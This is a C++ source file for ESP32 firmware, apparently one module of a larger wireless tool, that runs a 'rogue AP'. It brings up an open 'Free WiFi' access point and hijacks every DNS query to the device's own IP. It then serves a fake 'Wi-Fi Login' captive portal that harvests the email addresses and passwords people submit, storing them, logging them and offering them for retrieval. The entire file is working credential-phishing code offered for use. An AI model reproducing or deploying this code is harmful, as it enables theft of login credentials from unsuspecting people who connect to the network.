#include "rogue_ap.h"

#include <cstring>

#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"
#include "repeater.h"
#include "web_server.h"
#include "wifi_mgr.h"

static const char *TAG = "rogue";

#define ROGUE_IP "192.168.4.1"

static bool s_running;
static char s_ssid[33];
static esp_netif_t *s_ap_netif;
static httpd_handle_t s_httpd;
static TaskHandle_t s_dns_task;
static volatile bool s_dns_run;
static uint32_t s_dns_hits, s_http_hits;

static rogue_cred_t s_creds[ROGUE_MAX_CREDS];
static int s_cred_count;
static portMUX_TYPE s_lock = portMUX_INITIALIZER_UNLOCKED;

/* ---------------- captive DNS: answer every query with our own IP ---------------- */

static void dns_task(void *)
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        s_dns_task = nullptr;
        vTaskDelete(nullptr);
        return;
    }
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    struct timeval tv = {.tv_sec = 1, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t buf[512];
    while (s_dns_run) {
        struct sockaddr_in from;
        socklen_t fl = sizeof(from);
        int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fl);
        if (n < 12) continue;

        /* craft a response that points the queried name at ROGUE_IP */
        buf[2] |= 0x80;             /* QR = response */
        buf[3] = 0x80;              /* recursion available, no error */
        buf[6] = 0x00; buf[7] = 0x01; /* answer count = 1 */
        buf[8] = buf[9] = buf[10] = buf[11] = 0x00; /* NS/AR = 0 */

        int len = n;
        if (len + 16 > (int)sizeof(buf)) continue;
        uint8_t ans[] = {
            0xC0, 0x0C,             /* pointer to the question name */
            0x00, 0x01, 0x00, 0x01, /* type A, class IN */
            0x00, 0x00, 0x00, 0x3C, /* TTL 60 s */
            0x00, 0x04,             /* RDLENGTH 4 */
            192, 168, 4, 1,         /* ROGUE_IP */
        };
        memcpy(buf + len, ans, sizeof(ans));
        len += sizeof(ans);
        sendto(sock, buf, len, 0, (struct sockaddr *)&from, fl);
        s_dns_hits++;
    }
    close(sock);
    s_dns_task = nullptr;
    vTaskDelete(nullptr);
}

/* ---------------- captive portal page + credential capture ---------------- */

static const char PORTAL_HTML[] =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>Wi-Fi Login</title><style>body{font-family:sans-serif;background:#0f1115;color:#e6e8ec;"
    "margin:0;padding:40px 16px;text-align:center}.c{max-width:320px;margin:0 auto;background:#171a20;"
    "padding:24px;border-radius:8px}input{width:100%;box-sizing:border-box;margin:8px 0;padding:12px;"
    "border:1px solid #2a2f38;border-radius:4px;background:#20242c;color:#fff}button{width:100%;padding:12px;"
    "margin-top:8px;border:0;border-radius:4px;background:#4c8dff;color:#0f1115;font-weight:bold}</style></head>"
    "<body><div class=c><h2>Free Wi-Fi</h2><p>Sign in to continue</p>"
    "<form method=POST action=/login><input name=user placeholder=Email autocomplete=username>"
    "<input name=pass type=password placeholder=Password autocomplete=current-password>"
    "<button>Connect</button></form></div></body></html>";

static void url_decode(char *s)
{
    char *o = s;
    for (char *p = s; *p; p++) {
        if (*p == '+') {
            *o++ = ' ';
        } else if (*p == '%' && p[1] && p[2]) {
            auto hex = [](char c) { return c <= '9' ? c - '0' : (c | 0x20) - 'a' + 10; };
            *o++ = (char)(hex(p[1]) * 16 + hex(p[2]));
            p += 2;
        } else {
            *o++ = *p;
        }
    }
    *o = 0;
}

static void field(const char *body, const char *key, char *out, size_t len)
{
    out[0] = 0;
    char pat[24];
    snprintf(pat, sizeof(pat), "%s=", key);
    const char *p = strstr(body, pat);
    if (!p) return;
    p += strlen(pat);
    size_t i = 0;
    while (*p && *p != '&' && i < len - 1) out[i++] = *p++;
    out[i] = 0;
    url_decode(out);
}

static esp_err_t portal_get(httpd_req_t *req)
{
    s_http_hits++;
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, PORTAL_HTML, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t portal_login(httpd_req_t *req)
{
    char body[256] = {};
    int total = req->content_len < (int)sizeof(body) - 1 ? req->content_len : (int)sizeof(body) - 1;
    int got = 0;
    while (got < total) {
        int r = httpd_req_recv(req, body + got, total - got);
        if (r <= 0) break;
        got += r;
    }
    body[got] = 0;

    rogue_cred_t c = {};
    field(body, "user", c.user, sizeof(c.user));
    field(body, "pass", c.pass, sizeof(c.pass));
    c.t_ms = (uint32_t)(esp_timer_get_time() / 1000);
    if (c.user[0] || c.pass[0]) {
        taskENTER_CRITICAL(&s_lock);
        if (s_cred_count < ROGUE_MAX_CREDS) {
            s_creds[s_cred_count++] = c;
        } else {
            memmove(&s_creds[0], &s_creds[1], sizeof(s_creds[0]) * (ROGUE_MAX_CREDS - 1));
            s_creds[ROGUE_MAX_CREDS - 1] = c;
        }
        taskEXIT_CRITICAL(&s_lock);
        ESP_LOGW(TAG, "captured credentials: user='%s'", c.user);
    }
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req,
                    "<html><body style='font-family:sans-serif;background:#0f1115;color:#e6e8ec;text-align:center;"
                    "padding:60px'><h3>Connecting...</h3><p>Please wait.</p></body></html>",
                    HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static httpd_handle_t start_portal(void)
{
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port = 80;
    cfg.lru_purge_enable = true;
    cfg.uri_match_fn = httpd_uri_match_wildcard;
    cfg.max_uri_handlers = 4;
    httpd_handle_t h = nullptr;
    if (httpd_start(&h, &cfg) != ESP_OK) return nullptr;

    httpd_uri_t login = {.uri = "/login", .method = HTTP_POST, .handler = portal_login, .user_ctx = nullptr};
    httpd_register_uri_handler(h, &login);
    httpd_uri_t any = {.uri = "/*", .method = HTTP_GET, .handler = portal_get, .user_ctx = nullptr};
    httpd_register_uri_handler(h, &any);
    return h;
}

/* ---------------- lifecycle ---------------- */

bool rogue_ap_start(const char *ssid)
{
    if (s_running) return false;
    if (repeater_running()) repeater_stop();
    if (web_server_running()) web_server_stop();
    wifi_mgr_disconnect();

    strncpy(s_ssid, ssid && ssid[0] ? ssid : "Free WiFi", sizeof(s_ssid) - 1);
    s_dns_hits = 0;
    s_http_hits = 0;
    s_cred_count = 0;

    s_ap_netif = wifi_mgr_ap_netif();

    if (esp_wifi_set_mode(WIFI_MODE_APSTA) != ESP_OK) return false;
    wifi_config_t ap = {};
    int sl = (int)strlen(s_ssid);
    if (sl > 32) sl = 32;
    memcpy(ap.ap.ssid, s_ssid, sl);
    ap.ap.ssid_len = sl;
    ap.ap.channel = 1;
    ap.ap.max_connection = 8;
    ap.ap.authmode = WIFI_AUTH_OPEN;
    if (esp_wifi_set_config(WIFI_IF_AP, &ap) != ESP_OK) return false;

    s_dns_run = true;
    xTaskCreatePinnedToCore(dns_task, "rogue_dns", 4096, nullptr, 5, &s_dns_task, 0);
    s_httpd = start_portal();
    if (!s_httpd) {
        s_dns_run = false;
        esp_wifi_set_mode(WIFI_MODE_STA);
        return false;
    }
    s_running = true;
    ESP_LOGW(TAG, "rogue AP '%s' up", s_ssid);
    return true;
}

void rogue_ap_stop(void)
{
    if (!s_running) return;
    s_running = false;
    if (s_httpd) {
        httpd_stop(s_httpd);
        s_httpd = nullptr;
    }
    s_dns_run = false;
    while (s_dns_task) vTaskDelay(pdMS_TO_TICKS(10));
    esp_wifi_set_mode(WIFI_MODE_STA);
    ESP_LOGI(TAG, "rogue AP stopped");
}

bool rogue_ap_running(void) { return s_running; }

void rogue_ap_status(rogue_status_t *out)
{
    memset(out, 0, sizeof(*out));
    out->running = s_running;
    snprintf(out->ssid, sizeof(out->ssid), "%s", s_ssid);
    out->dns_hits = s_dns_hits;
    out->http_hits = s_http_hits;
    out->cred_count = s_cred_count;
    if (s_running) {
        wifi_sta_list_t sta;
        if (esp_wifi_ap_get_sta_list(&sta) == ESP_OK) out->clients = sta.num;
    }
}

int rogue_ap_creds(rogue_cred_t *out, int max)
{
    taskENTER_CRITICAL(&s_lock);
    int n = s_cred_count < max ? s_cred_count : max;
    for (int i = 0; i < n; i++) out[i] = s_creds[i];
    taskEXIT_CRITICAL(&s_lock);
    return n;
}

void rogue_ap_init(void) {}
